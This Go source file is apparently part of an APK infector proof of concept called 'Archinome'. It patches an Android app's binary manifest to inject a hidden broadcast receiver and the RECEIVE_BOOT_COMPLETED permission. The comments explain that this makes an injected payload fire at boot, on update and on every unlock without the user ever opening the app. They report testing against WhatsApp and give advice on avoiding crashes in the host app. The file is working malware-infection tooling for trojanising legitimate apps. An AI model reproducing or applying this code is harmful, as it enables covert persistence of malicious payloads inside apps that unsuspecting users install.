package manifest

// Receiver (system-broadcast auto-start) injection vector.
//
// Injects a <receiver android:name="aaaaaaaaaaaa.ArchinomeReceiver"
// android:exported="false"> element as the first child of <application>,
// with an <intent-filter> matching BOOT_COMPLETED, MY_PACKAGE_REPLACED and
// USER_PRESENT, plus the <uses-permission
// android:name="android.permission.RECEIVE_BOOT_COMPLETED"/> entry the boot
// receiver needs.
//
// This makes the payload fire WITHOUT the user ever opening the app: the
// system starts the app's process in the background to deliver these
// broadcasts. All three are on the manifest-broadcast exception list from the
// Android 8.0 background-execution limits, so a manifest-declared receiver
// still works. exported=false is enough for system broadcasts (BOOT_COMPLETED,
// MY_PACKAGE_REPLACED and USER_PRESENT are all protected, sent by system_server)
// and keeps the receiver unreachable from other apps.
//
// Real-device behaviour (verified against com.whatsapp, Pixel 6a A14):
//   * BOOT_COMPLETED fires after reboot + user unlock, even if the app was
//     never launched (system sends it with FLAG_INCLUDE_STOPPED_PACKAGES).
//   * MY_PACKAGE_REPLACED fires on reinstall/update, but only once the app is
//     out of the "stopped" state (launched at least once, or reached by a
//     boot broadcast).
//   * USER_PRESENT fires on each unlock, same stopped-state caveat.
//
// DO NOT add "android:directBootAware=true" + ACTION_LOCKED_BOOT_COMPLETED to
// make it fire before first unlock: the process then starts in direct-boot mode
// (credential-encrypted storage locked), the target app's Application.onCreate
// runs in that restricted context and crashes (e.g. WhatsApp AppShell dies with
// StackOverflowError before onReceive is ever called). directBootAware=false is
// the safe default for any app that is not itself direct-boot ready.
//
// Binary AXML surgery, same approach as PatchProvider / PatchTrampoline:
//   1. append new strings (tag names, class name, permission, actions)
//   2. ensure the "exported" attr resource id (0x01010010) is in the res map
//      ("name" 0x01010003 is always present)
//   3. insert <uses-permission/> just before <application> (manifest child)
//   4. insert <receiver>…<intent-filter><action/>x3…<intent-filter></receiver>
//      as the first child of <application>
//   5. fix the AXML total size

import (
	"log"
	"os"
	"sort"

	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
)

const (
	receiverTagStr          = "receiver"
	receiverClassName       = "aaaaaaaaaaaa.ArchinomeReceiver"
	usesPermissionTagStr    = "uses-permission"
	intentFilterTagStr      = "intent-filter"
	actionTagStr            = "action"
	receiveBootPm           = "android.permission.RECEIVE_BOOT_COMPLETED"
	bootCompletedAction     = "android.intent.action.BOOT_COMPLETED"
	myPackageReplacedAction = "android.intent.action.MY_PACKAGE_REPLACED"
	userPresentAction       = "android.intent.action.USER_PRESENT"

	resIDExported = 0x01010010
)

func PatchReceiver() {
	data, err := os.ReadFile(utils.ManifestBinaryPath)
	if err != nil {
		log.Panicf("Failed to read %s", utils.ManifestBinaryPath)
	}

	pool := parseStringPool(data)

	androidNs := pool.indexOf(data, androidNamespaceURI)
	if androidNs < 0 {
		log.Panic("android namespace URI not found in string pool")
	}

	// resource map: 'name' must exist; ensure 'exported' present
	resMapOff := findChunk(data, chunkResMap)
	if resMapOff < 0 {
		log.Panic("resource map chunk not found")
	}
	resMapSizeOrig := int(leU32(data, resMapOff+4))
	resMapCount := (resMapSizeOrig - int(leU16(data, resMapOff+2))) / 4
	resIds := make([]uint32, resMapCount)
	for i := 0; i < resMapCount; i++ {
		resIds[i] = leU32(data, resMapOff+8+i*4)
	}
	nameResIdx := indexOfU32(resIds, resIDName)
	if nameResIdx < 0 {
		log.Panic("'name' attribute resource id not found in resource map")
	}
	exportedResIdx := indexOfU32(resIds, resIDExported)
	var newResIDBytes []byte
	if exportedResIdx < 0 {
		exportedResIdx = len(resIds)
		newResIDBytes = u32bytes(resIDExported)
	}

	// append new strings
	var newStrings []string
	addStr := func(s string) uint32 {
		if idx := pool.indexOf(data, s); idx >= 0 {
			return uint32(idx)
		}
		i := uint32(pool.stringCount + len(newStrings))
		newStrings = append(newStrings, s)
		return i
	}
	receiverTagIdx := addStr(receiverTagStr)
	receiverClassIdx := addStr(receiverClassName)
	usesPermTagIdx := addStr(usesPermissionTagStr)
	intentFilterTagIdx := addStr(intentFilterTagStr)
	actionTagIdx := addStr(actionTagStr)
	bootPermIdx := addStr(receiveBootPm)
	bootActionIdx := addStr(bootCompletedAction)
	replacedActionIdx := addStr(myPackageReplacedAction)
	userPresentActionIdx := addStr(userPresentAction)

	// encode appended strings
	oldDataSize := pool.size - pool.stringsStart
	var newOffsetBytes, newStringBytes []byte
	acc := oldDataSize
	for _, s := range newStrings {
		enc := encodeString(pool.flags, s)
		newOffsetBytes = append(newOffsetBytes, u32bytes(uint32(acc))...)
		newStringBytes = append(newStringBytes, enc...)
		acc += len(enc)
	}
	newStringCount := pool.stringCount + len(newStrings)
	newStringsStart := pool.stringsStart + len(newStrings)*4
	newPoolSize := pool.size + len(newOffsetBytes) + len(newStringBytes)
	if pad := (4 - newPoolSize%4) % 4; pad != 0 {
		newStringBytes = append(newStringBytes, make([]byte, pad)...)
		newPoolSize += pad
	}

	// chunk builders
	buildUsesPermission := func() []byte {
		start := buildStartTag(usesPermTagIdx, []elemAttr{
			{uint32(androidNs), uint32(nameResIdx), bootPermIdx, 0x03, bootPermIdx},
		})
		return append(start, buildEndTag(usesPermTagIdx)...)
	}
	buildAction := func(actionIdx uint32) []byte {
		start := buildStartTag(actionTagIdx, []elemAttr{
			{uint32(androidNs), uint32(nameResIdx), actionIdx, 0x03, actionIdx},
		})
		return append(start, buildEndTag(actionTagIdx)...)
	}
	buildIntentFilter := func() []byte {
		buf := buildStartTag(intentFilterTagIdx, nil)
		buf = append(buf, buildAction(bootActionIdx)...)
		buf = append(buf, buildAction(replacedActionIdx)...)
		buf = append(buf, buildAction(userPresentActionIdx)...)
		return append(buf, buildEndTag(intentFilterTagIdx)...)
	}
	buildReceiver := func() []byte {
		start := buildStartTag(receiverTagIdx, []elemAttr{
			{uint32(androidNs), uint32(nameResIdx), receiverClassIdx, 0x03, receiverClassIdx},
			{uint32(androidNs), uint32(exportedResIdx), 0xFFFFFFFF, 0x12, 0},
		})
		buf := append(start, buildIntentFilter()...)
		return append(buf, buildEndTag(receiverTagIdx)...)
	}

	// locate <application> start tag
	appStrIdx := pool.indexOf(data, "application")
	if appStrIdx < 0 {
		log.Panic("'application' string not found")
	}
	appStartOff := -1
	for off := 8; off+8 <= len(data); {
		t := leU16(data, off)
		sz := int(leU32(data, off+4))
		if sz < 8 || off+sz > len(data) {
			break
		}
		if t == chunkTagStart && int(leU32(data, off+20)) == appStrIdx {
			appStartOff = off
			break
		}
		off += sz
	}
	if appStartOff < 0 {
		log.Panic("application start tag not found")
	}

	// edits
	type edit struct {
		off int
		del int
		val []byte
	}
	var edits []edit

	edits = append(edits,
		edit{pool.off + 4, 4, u32bytes(uint32(newPoolSize))},
		edit{pool.off + 8, 4, u32bytes(uint32(newStringCount))},
		edit{pool.off + 20, 4, u32bytes(uint32(newStringsStart))},
		edit{pool.off + 28 + pool.stringCount*4, 0, newOffsetBytes},
		edit{pool.off + pool.size, 0, newStringBytes},
		edit{axmlSizeOff, 4, u32bytes(uint32(len(data)))}, // placeholder, fixed below
	)
	if len(newResIDBytes) > 0 {
		edits = append(edits,
			edit{resMapOff + 4, 4, u32bytes(uint32(resMapSizeOrig + len(newResIDBytes)))},
			edit{resMapOff + resMapSizeOrig, 0, newResIDBytes},
		)
	}
	// uses-permission right before <application> (manifest child)
	edits = append(edits, edit{appStartOff, 0, buildUsesPermission()})
	// receiver as first child of <application>
	appStartSize := int(leU32(data, appStartOff+4))
	edits = append(edits, edit{appStartOff + appStartSize, 0, buildReceiver()})

	newTotal := len(data)
	for _, e := range edits {
		newTotal += len(e.val) - e.del
	}
	// fix the total-size edit with the real value
	for i := range edits {
		if edits[i].off == axmlSizeOff {
			edits[i].val = u32bytes(uint32(newTotal))
		}
	}

	sort.SliceStable(edits, func(i, j int) bool { return edits[i].off < edits[j].off })

	out := make([]byte, 0, newTotal)
	cursor := 0
	for _, e := range edits {
		out = append(out, data[cursor:e.off]...)
		out = append(out, e.val...)
		cursor = e.off + e.del
	}
	out = append(out, data[cursor:]...)

	utils.WriteChanges(out, utils.ManifestBinaryPath)
	log.Printf("Receiver injected: %s (BOOT_COMPLETED/MY_PACKAGE_REPLACED/USER_PRESENT), manifest size 0x%x -> 0x%x",
		receiverClassName, len(data), len(out))
}